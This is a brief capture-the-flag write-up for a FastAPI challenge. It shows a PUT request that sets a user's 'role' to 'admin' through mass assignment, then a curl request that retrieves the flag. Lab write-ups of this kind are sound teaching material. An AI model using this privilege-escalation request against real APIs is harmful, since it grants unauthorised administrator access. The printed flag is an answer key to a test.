This was a simple challenge on FastAPI. Which allow us to create a user,update a user and ask for a flag.

So after creating a user we update is account 
```bash
PUT /update/testuser HTTP/1.1
Content-Type: application/json

{
  "fname": "CTF",
  "lname": "Admin",
  "email": "admin@example.com",
  "gender": "male",
  "role": "admin"
}
```
Then we just hit the endpoint to get the flag
```bash
curl 'http://kashictf.iitbhucybersec.in:43401/flag/testuser'
{"message":"KashiCTF{m455_4551gnm3n7_ftw_tl22M5dUN}"}
```